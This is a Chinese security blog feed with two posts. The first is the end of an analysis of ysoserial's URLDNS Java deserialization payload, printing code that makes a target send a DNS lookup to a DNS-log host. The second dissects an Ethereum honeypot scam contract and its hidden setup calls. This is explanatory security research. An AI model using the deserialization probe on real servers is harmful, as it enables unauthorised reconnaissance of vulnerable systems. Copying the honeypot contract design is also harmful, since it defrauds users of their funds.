</li><li>之后相同</li></ol><p>看以上调用过程可以发现：我们要执行的是URL查询的方法<code>URL-&gt;hashCode()</code>，而HashMap只是我们的一层封装。</p><h3 id="回看payload生成"><a href="#回看payload生成" class="headerlink" title="回看payload生成"></a>回看payload生成</h3><p>总结以上反序列化过程，我们可以得出要成功完成反序列化过程触发DNS请求，payload需要满足以下2个条件</p><ol><li>HashMap对象中有一个key为URL对象的键值对</li><li>这个URL对象的hashcode需要为-1</li></ol><p>回头看看测试代码是怎么实现的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">"http://xxx.ceye.io"</span>);</span><br><span class="line">Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//----</span></span><br><span class="line">f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">f.set(url, -<span class="number">1</span>); </span><br><span class="line"><span class="comment">//----</span></span><br></pre></td></tr></table></figure><p>前面创建hashmap，url对象，由于hashCode是private属性，更改访问权限让它变得允许修改都没问题。</p><p>但是下面这块为啥不能直接把URL对象put进去hashmap就好了？反而要设置成别的值再设置回来？</p><p>我们需要关注一下<code>java.util.HashMap#put</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现put里面的语句跟我们之前看到的会触发DNS查询的语句一模一样，同时URL对象再初始化之后的hashCode默认为-1。</p><p>也就是说在我们生成payload的过程中，如果不做任何修改就直接把URL对象放入HashMap是在本地触发一次DNS查询的。</p><p>把<code>f.set(url, 0xdeadbeef);</code>这句话注释了看看：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1vz3hfgj312w0sv75w.jpg" alt="回顾payload生成.png"></p><p>这时候hashCode默认为-1，然后就会进入<code>hash(key)</code>触发DNS查询。这就会混淆是你本地的查询还是对方机器的查询的DNS。在put之前修改个hashCode，就可以避免触发。</p><p>而在put了之后：</p><ul><li>如果之前没有<code>f.set(url, 0xdeadbeef);</code>修改hashCode，就会完成DNS查询的同时，计算出hashCode，从而修改成不为-1的值。这个hashcode会被序列化传输，到对方机器时就会因为不是-1而跳过DNS查询流程</li><li>如果之前修改了hashCode，那自然也会直接被序列化传输，不是-1也会跳过DNS查询流程。</li></ul><p>所以需要<code>f.set(url, -1);</code>把这个字段改回来-1。</p><h3 id="看看Ysoserial是怎么做的"><a href="#看看Ysoserial是怎么做的" class="headerlink" title="看看Ysoserial是怎么做的"></a>看看Ysoserial是怎么做的</h3><p>我们可以使用JAR调试的第三种方法，JAR源代码调试去看看Ysoserial的实现细节。（git clone Ysoserial项目来获取源码）</p><p>在<code>ysoserial.payloads.URLDNS#getObject</code>处下断点调试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//SilentURLStreamHandler 是一个自主写的避免生成payload的时候形成URL查询的骚操作，我们之后会分析。</span></span><br><span class="line">    <span class="comment">//用这种骚操作的前提是URL对象的handler属性是transient类型；</span></span><br><span class="line">    <span class="comment">//这代表我们自主写的骚操作不会被写入反序列化的代码中，不会对结果造成影响</span></span><br><span class="line">    URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"><span class="comment">//来一个HashMap</span></span><br><span class="line">    HashMap ht = <span class="keyword">new</span> HashMap(); </span><br><span class="line">    <span class="comment">//再来一个URL对象，这里把SilentURLStreamHandler这个handler传入进去，等会看看做了啥</span></span><br><span class="line">    URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">//传入的URL是我们传入的DNS查询的目标</span></span><br><span class="line">    <span class="comment">//URL作为key值和HashMap duang~ 此处的value值是可以随便设置的，这里设置为url</span></span><br><span class="line">    ht.put(u, url); </span><br><span class="line"><span class="comment">//按照我们之前分析，以上的put操作讲道理会触发一次DNS查询</span></span><br><span class="line">    <span class="comment">//这里使用了SilentURLStreamHandler的骚操作进行避免，但是同样为URL对象计算保存了一个hashCode</span></span><br><span class="line">    <span class="comment">//所以为了在对方机器上DNS成功，在这里重置一下hashCode为-1</span></span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体看看SilentURLStreamHandler是怎么做的：<code>ysoserial.payloads.URLDNS.SilentURLStreamHandler</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>SilentURLStreamHandler</code>类继承了<code>URLStreamHandler</code>类，然后写了个空的<strong>getHostAddress</strong>方法。</p><p>根据JAVA的继承子类的同名方法会覆盖父类方法的原则，这个骚操作的思路大概就是本来执行<code>URLStreamHandler.getHostAddress</code>我们写一个URLStreamHandler的子类<code>SilentURLStreamHandler</code>的getHostAddress，然后啥都不做，这样就不会在生成payload的时候去请求DNS。</p><p>来用调试过程来证实一下：</p><p>先把自定义的SilentURLStreamHandler塞到URL对象中：<code>URL u = new URL(null, url, handler);</code></p><p><code>java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)#605行</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1vhwypaj31cm0u9gnr.jpg" alt="handler.png"></p><p>然后在<code>ht.put(u, url);</code>中，按照预定的路径HashMap-&gt;hash()、URL-&gt;hashCode()、URLStreamHandler-&gt;hashCode()。之后就遇到了getHostAddress(u)</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gcj1vnnmt5j31mj13cq99.jpg" alt="getHostAddress.png"></p><p>但是从左下角的调用栈就可以看到，之后不是进入<code>URLStreamHandler-&gt;getHostAddress()</code>而是<code>SilentURLStreamHandler#getHostAddress</code>，这将会返回NULL。</p><p>至此Ysoserial用一个子类继承完成了规避DNSLOG；而测试代码用先改变HashCode完成了规避DNSLOG。</p><p>讲道理应该后者简单方便一点，但是总感觉Ysoserial的方法有种秘之炫技和优雅。</p><p>这就是大佬么，膜了膜了，爱了爱了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7157" target="_blank" rel="noopener">https://xz.aliyun.com/t/7157</a></p><p><a href="http://www.lmxspace.com/2019/12/20/ysoserial-C3P0/#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" target="_blank" rel="noopener">http://www.lmxspace.com/2019/12/20/ysoserial-C3P0/#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/12378269.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/12378269.html</a></p><p>知识星球-代码审计：Java安全漫谈 - 08.反序列化篇(2)</p><blockquote><p>本文由安全客原创发布<br>转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201762</a><br>安全客 - 有思想的安全新媒体</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;推荐阅读时间：10min&lt;/p&gt;
&lt;p&gt;内容-基础向：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在IDEA中JAR的三种调试方式&lt;/li&gt;
&lt;li&gt;Yso
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
      <category term="ysoserial" scheme="http://lalajun.com/tags/ysoserial/"/>
    
  </entry>
  
  <entry>
    <title>智能合约蜜罐-区块链浏览器</title>
    <link href="http://lalajun.com/2020/02/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%9C%9C%E7%BD%90-%E5%8C%BA%E5%9D%97%E9%93%BE%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    <id>http://lalajun.com/2020/02/14/智能合约蜜罐-区块链浏览器/</id>
    <published>2020-02-14T07:07:12.000Z</published>
    <updated>2020-02-14T08:21:29.896Z</updated>
    
    <content type="html"><![CDATA[<p>一篇以前写的文，现在修改补充了些许，发了上来</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>智能合约蜜罐相对于互联网蜜罐的目的有着本质的区别：后者着重在于诱导攻击,然后做检测分析，来收集攻击手法与漏洞；而前者更像是一场赌博的骗局，利用种种方法，诱导目标转账进入合约，完成韭菜收割。但是这个蜜罐的名词也是挺恰当的，就也这么叫了。</p><p>有趣的是智能合约蜜罐其目标锁定在智能合约开发者，智能合约代码审计人员，略懂区块链技术的信息安全人员(emmmm)</p><p>通常而言智能合约蜜罐的欺骗性在于区块链漏洞，逻辑漏洞；又或是赌博合约。<br>此处介绍的是利用第三方组件导致的智能合约蜜罐。</p><h2 id="智能合约蜜罐的奇特组件——区块链浏览器"><a href="#智能合约蜜罐的奇特组件——区块链浏览器" class="headerlink" title="智能合约蜜罐的奇特组件——区块链浏览器"></a>智能合约蜜罐的奇特组件——区块链浏览器</h2><p>蜜罐合约地址：<a href="https://etherscan.io/address/0xcEA86636608BaCB632DfD1606A0dC1728b625387" target="_blank" rel="noopener">0xcEA86636608BaCB632DfD1606A0dC1728b625387</a></p><p>我们可以通过Etherscan浏览器看到该合约的外部交易，内部调用，代码，代码abi等信息</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gbw07e52lfj30u40iedjk.jpg" alt="合约.png"></p><h3 id="智能合约代码分析"><a href="#智能合约代码分析" class="headerlink" title="智能合约代码分析"></a>智能合约代码分析</h3><p>先来看关键的智能合约代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.20</span>;</span><br><span class="line"></span><br><span class="line">contract QUESTION</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//玩家 输入答案字符串开始玩游戏</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Play</span>(<span class="params">string _response</span>)</span></span><br><span class="line"><span class="function">    <span class="title">external</span></span></span><br><span class="line"><span class="function">    <span class="title">payable</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//需要该玩家地址不为智能合约地址</span></span><br><span class="line">        <span class="built_in">require</span>(msg.sender == tx.origin);</span><br><span class="line">        <span class="comment">//如果答案的sha256哈希=答案hash 并且 传入的押金超过1ether</span></span><br><span class="line">        <span class="keyword">if</span>(responseHash == keccak256(_response) &amp;&amp; msg.value&gt;<span class="number">1</span> ether)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//给该玩家转账该智能合约所有的钱</span></span><br><span class="line">            msg.sender.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    string public question;</span><br><span class="line"> </span><br><span class="line">    address questionSender;</span><br><span class="line">  </span><br><span class="line">    bytes32 responseHash;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//开始游戏，传入题目和答案的字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">StartGame</span>(<span class="params">string _question,string _response</span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">payable</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//如果答案hash没有被赋值</span></span><br><span class="line">        <span class="keyword">if</span>(responseHash==<span class="number">0x0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算sha256赋值答案hash</span></span><br><span class="line">            responseHash = keccak256(_response);</span><br><span class="line">            <span class="comment">//赋值题目字符串</span></span><br><span class="line">            question = _question;</span><br><span class="line">            <span class="comment">//赋值题目发送者的地址，为调用者的地址</span></span><br><span class="line">            questionSender = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">StopGame</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">payable</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//需要调用者等于题目发送者</span></span><br><span class="line">       <span class="built_in">require</span>(msg.sender==questionSender);</span><br><span class="line">       <span class="comment">//给调用者转账所有eth</span></span><br><span class="line">       msg.sender.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//更新一个新的问题，传入题目字符串，答案hash</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">NewQuestion</span>(<span class="params">string _question, bytes32 _responseHash</span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">payable</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//需要调用者等于题目发送者</span></span><br><span class="line">        <span class="built_in">require</span>(msg.sender==questionSender);</span><br><span class="line">        <span class="comment">//更新题目</span></span><br><span class="line">        question = _question;</span><br><span class="line">        <span class="comment">//更新答案hash</span></span><br><span class="line">        responseHash = _responseHash;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//该智能合约fallback函数可以接受钱</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>很简单的一个合约，大致就是猜答案:hash符合就给所有钱</p><p>这是明显存在漏洞的智能合约：</p><ol><li>在区块链上的交易调用都是可见的，我们可以在区块链浏览器中看到（相当于是默认允许中间人攻击的监听）。在Etherscan中可以直接解密。而在函数的StartGame函数中，response是直接明文传入然后再进行hash存储，即问题设置的答案完全可以被知道</li><li>Play()只允许由用户账户调用，而不允许由合约账户调用（require(msg.sender == tx.origin);）。这意味着当答题者发布交易调用Play()，问题的部署者可能会在交易池中一直监听。当监听到Play()交易时，问题部署者用更高的gasprice提交newQuestion函数去修改答案。从而使答题者的答案错误，完成欺骗。但是这种攻击较为繁琐，也具有一定风险。</li></ol><p>也有一些奇怪的地方。</p><p><strong>疑点1</strong>：</p><ul><li>NewQuestion(string _question, bytes32 _responseHash)是用responseHash设置答案。</li><li>StartGame(string _question,string _response)却是用respon明文设置答案</li></ul><p>既然有函数知道用responseHash传入，也就代表着开发者应该是意识到了这个问题。这里是故意为之还是萌新犯蠢？</p><p><strong>疑点2</strong>：</p><ul><li>if(responseHash==0x0) 其他地方用require作为异常抛出，唯独这里用if做判断，将会不抛出异常。代码风格有点不统一。</li></ul><h3 id="Etherscan区块链浏览器上的交易分析"><a href="#Etherscan区块链浏览器上的交易分析" class="headerlink" title="Etherscan区块链浏览器上的交易分析"></a>Etherscan区块链浏览器上的交易分析</h3><p>由于这是一个已经收网成功的蜜罐合约，我们队区块链浏览器上已经产生的交易进行分析，看看这个蜜罐钓鱼的过程。</p><p>Etherscan上的交易记录：<a href="https://etherscan.io/address/0xCEA86636608BACB632DFD1606A0DC1728B625387" target="_blank" rel="noopener">0xCEA86636608BACB632DFD1606A0DC1728B625387</a></p><p>包括：4个外部交易，1个内部交易</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gbvzpqjbecj315o0afmzw.jpg" alt="4个交易.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gbvzpwkl7vj315o06babc.jpg" alt="1个调用.png"></p><blockquote><p>在2020.02.14去看Etherscan，会发现交易不会直接帮我们解析出调用过程的参数，但是可以用下面介绍了另一种方法得到解析。</p></blockquote><p><strong>按照时间线排序分析</strong></p><p>外部交易0xf9f25d… 0x8F1F6FEb78BA90ad003E1B7408caA164aD90830d地址创建合约(创建合约)</p><p>外部交易0x41365…  创建者使用交易调用合约函数Startgame(),带上1.03Ether（部署问题和答案，从结果来看，这应该是一个抛饵行为）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8sejfzwj30vr0fw0tt.jpg" alt></p><p>外部交易0xcb589e… 受害者使用交易调用合约函数Play(),没有value，即没有带钱（受害者试探，由于没有带钱是不会通过if判断的）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8sn80drj30vy0fimy8.jpg" alt></p><p>外部交易0x8486f4… 受害者使用交易调用合约函数Play(),带上1.05Ether的钱（受害者上钩，提交了1Ether以上的钱，讲道理按照逻辑这里应该获得合约返回的亲，但是并没有这笔交易）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8su8ecpj30vs0fl3zi.jpg" alt></p><p>内部调用0xb68f60… 合约把所有钱转账给了另一个合约0x4B2838d9326bD5126F0573D9b5c71C0626Ab28f2（创建者收网，暴露出了一个合约地址）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8vjq04vj30wn06ejrs.jpg" alt></p><p>我们得到两个地址，我们给他取个别名：<br>钓鱼者：0x8F1F6FEb78BA90ad003E1B7408caA164aD90830d<br>还引出了一个奇怪的创建者收网用的智能合约：<br>钓鱼中间合约：0x4B2838d9326bD5126F0573D9b5c71C0626Ab28f2</p><p>总体流程总结如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gbvzrpaocfj30y90g440z.jpg" alt="流程1.png"></p><h3 id="尝试分析中间智能合约"><a href="#尝试分析中间智能合约" class="headerlink" title="尝试分析中间智能合约"></a>尝试分析中间智能合约</h3><p>尝试在Etherscan中查看<a href="https://etherscan.io/address/0x4b2838d9326bd5126f0573d9b5c71c0626ab28f2#internaltx" target="_blank" rel="noopener">0x4B2838d9326bD5126F0573D9b5c71C0626Ab28f2</a>钓鱼中间合约</p><p>发现该智能合约源码不公开，由0x78d39cDf39e80498237BC330e752DaBd8f90AC2f（从转钱结果推断，取名为钓鱼者小号）进行创建，并且该地址对钓鱼中间合约进行了几次调用。就触发了0xcEA86636608BaCB632DfD1606A0dC1728b625387（钓鱼合约）给该中间智能合约转钱。</p><p>但是拥有钓鱼合约源码的我们可以知道，只有对合约的Stopgame()函数产生调用，该智能合约才会对外转钱。中间合约肯定调用了钓鱼合约，才导致钓鱼合约会给中间合约转钱</p><p>其中一定有一些我们通过区块链浏览器看不见的调用在发生。</p><p>而钓鱼合约运行不在我们预期之内，就是因为这些看不见的调用。</p><h3 id="寻找缺失的版图"><a href="#寻找缺失的版图" class="headerlink" title="寻找缺失的版图"></a>寻找缺失的版图</h3><p>四处寻找有没有能显示这些预计之外的调用的区块链浏览器。</p><ul><li>与Etherscan结果类似的Tokenview：<a href="https://tokenview.com/cn/eth/address/0xcea86636608bacb632dfd1606a0dc1728b625387" target="_blank" rel="noopener">https://tokenview.com/cn/eth/address/0xcea86636608bacb632dfd1606a0dc1728b625387</a><br>4个外部交易，2个call调用（多了一个外部call调用，但是只是把合约创建又分作外部调用，又分作内部调用）</li></ul><p>然后就找到了完全暴露的智能合约内部call调用etherchain：<a href="https://www.etherchain.org/account/cea86636608bacb632dfd1606a0dc1728b625387" target="_blank" rel="noopener">https://www.etherchain.org/account/cea86636608bacb632dfd1606a0dc1728b625387</a></p><p>一个合约创建，3个外部交易，4个call调用</p><h3 id="真实交易分析"><a href="#真实交易分析" class="headerlink" title="真实交易分析"></a>真实交易分析</h3><p>在完整的调用分析前，重新理一下相关地址：</p><table><thead><tr><th style="text-align:center">命名</th><th style="text-align:center">地址</th></tr></thead><tbody><tr><td style="text-align:center">钓鱼者</td><td style="text-align:center">0x8F1F6FEb78BA90ad003E1B7408caA164aD90830d</td></tr><tr><td style="text-align:center">钓鱼者创建鱼钩智能合约</td><td style="text-align:center">0xcEA86636608BaCB632DfD1606A0dC1728b625387</td></tr><tr><td style="text-align:center">钓鱼者小号</td><td style="text-align:center">0x78d39cDf39e80498237BC330e752DaBd8f90AC2f</td></tr><tr><td style="text-align:center">钓鱼中间智能合约</td><td style="text-align:center">0x4B2838d9326bD5126F0573D9b5c71C0626Ab28f2</td></tr></tbody></table><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8raijapj30xz0fpmyy.jpg" alt="真实交易分析"></p><p>与原先Etherscan交易对比可知，与之前相比多了3个call调用，均是由中间智能合约发起。（交易调用时间顺序整体是下面的条目时间早，但是同一区块的条目，上面的时间早）</p><p>下面的两个call调用发生在部署智能合约之后，部署者调用StartGame之前，受害者输入答案之前。应该就是我们之前疏忽的关键调用。</p><p>这两个call调用都是属于一笔之前没有出现过的交易0x1754a4ecaecff5e6f3d6fd6384f80e00535fa50318de369b57fbb4dc2495defa中</p><p>在Etherscan中查看<a href="https://etherscan.io/tx/0x1754a4ecaecff5e6f3d6fd6384f80e00535fa50318de369b57fbb4dc2495defa" target="_blank" rel="noopener">该笔交易</a>，</p><p>由于这样看到的交易的input是钓鱼者小号调用钓鱼中间合约的input。我们想看到的两个call调用在虚拟机调用层面，才能查看。</p><p>查看<strong>Tools&amp;Utilities</strong> -&gt;  <strong>Parity Trace</strong> 查看智能合约中<a href="https://etherscan.io/vmtrace?txhash=0x1754a4ecaecff5e6f3d6fd6384f80e00535fa50318de369b57fbb4dc2495defa&amp;type=parity" target="_blank" rel="noopener">函数调用栈的情况</a>。（虽然Etherchain也有Parity Trace，但是Etherscan较为友好，Etherscan作为用的最多的区块链浏览器也是有原因的）</p><p>有三个调用栈：</p><p>第一个调用是钓鱼者小号0x78d39c…对于中间合约的调用。不管。</p><p>第二个调用：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8pjf5x1j30sr0gjq3r.jpg" alt="call1"></p><p>第三个调用：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8qae92vj30pi0fhmxs.jpg" alt="call2"></p><p>都对钓鱼合约进行了调用。</p><p>关注其中input数据到底调用了什么，利用<a href="https://lab.miguelmota.com/ethereum-input-data-decoder/example/" target="_blank" rel="noopener">ethereum-input-decoder</a>解密</p><ul><li>从Etherscan中钓鱼智能合约的code中获取abi填入，填入input</li></ul><p>第二个调用：调用StartGame，传入问题，答案<br><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8q1oqyxj30gb08bjr9.jpg" alt="call1_de"></p><p>第三个调用：调用NewQuestion，传入问题，答案hash<br><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8qijudvj30h10gxjrd.jpg" alt="call2_de"></p><p>可以看出，其实真正的答案是先用了StartGame设定，再NewQuestion修改。<br>之后我们看到的钓鱼者的StartGame调用，由于<code>if(responseHash==0x0)</code>验证不通过，不会对智能合约答案造成影响，只是一个烟雾弹。</p><p>同理看一下多出来的上面的那个call调用（在受害者上钩之后）：<br>交易：<a href="https://etherscan.io/tx/0xb86f60ff9a075a30aa4008c1cd70ed15f424d141c4de5b3afbadd9d7a18f97b4" target="_blank" rel="noopener">https://etherscan.io/tx/0xb86f60ff9a075a30aa4008c1cd70ed15f424d141c4de5b3afbadd9d7a18f97b4</a><br>函数调用情况：<a href="https://etherscan.io/vmtrace?txhash=0xb86f60ff9a075a30aa4008c1cd70ed15f424d141c4de5b3afbadd9d7a18f97b4&amp;type=parity" target="_blank" rel="noopener">https://etherscan.io/vmtrace?txhash=0xb86f60ff9a075a30aa4008c1cd70ed15f424d141c4de5b3afbadd9d7a18f97b4&amp;type=parity</a></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8qrcexbj30qe0g6t9a.jpg" alt="call3"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1fyz8qxsxhcj30hh0c5jr8.jpg" alt="call3_de"></p><p>利用中间钓鱼合约完成收网。</p><p><strong>真实交易时间线</strong>：</p><ol><li>block:5806406 | 钓鱼小号部署中间合约(钓鱼准备)</li><li>block:5873826 | 钓鱼者创建钓鱼合约(准备出发钓鱼)</li><li>block:5873890 | 钓鱼小号控制中间合约调用钓鱼合约StartGame()函数，传入问题，sZs答案（钓鱼准备ing）</li><li>block:5873890 | 钓鱼小号控制中间合约调用钓鱼合约newQuestion()函数，传入问题，一个答案hash（钓鱼准备ing）</li><li>block:5873943 | 钓鱼者使用交易调用钓鱼合约Startgame(),传入问题，带上1.03Ether（烟雾弹+抛饵）</li><li>block:5881051 | 受害者使用交易调用合约函数Play(),没有带钱（鱼儿试探）</li><li>block:5881054 | 受害者使用交易调用合约函数Play(),带上1.05Ether的钱（鱼儿上钩）</li><li>block:5881321 | 钓鱼小号控制中间合约调用钓鱼合约StopGame()函数，撤回钱</li></ol><p>至此完美完成了一次智能合约蜜罐攻击，一次利用以太坊最流行区块链浏览器Ethersacn的缺陷，打一个信息差的蜜罐钓鱼</p><p>流程图如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gbvzqwhtc0j31090hvq63.jpg" alt="流程2.png"></p><h3 id="再读智能合约代码"><a href="#再读智能合约代码" class="headerlink" title="再读智能合约代码"></a>再读智能合约代码</h3><p>再回过头去去看看似乎萌新弱鸡的代码，处处用心险恶</p><p>之前疑点1：</p><ul><li>NewQuestion(string _question, bytes32 _responseHash)是用responseHash设置答案。</li><li>StartGame(string _question,string _response)却是用respon明文设置答案</li></ul><p>StartGame用于钓鱼，NewQuestion用于传递真实答案，即使被发现了Etherscan以太坊浏览器存在该不会完全显示call调用的问题也不能被破解。</p><p>之前疑点2：</p><ul><li>if(responseHash==0x0) 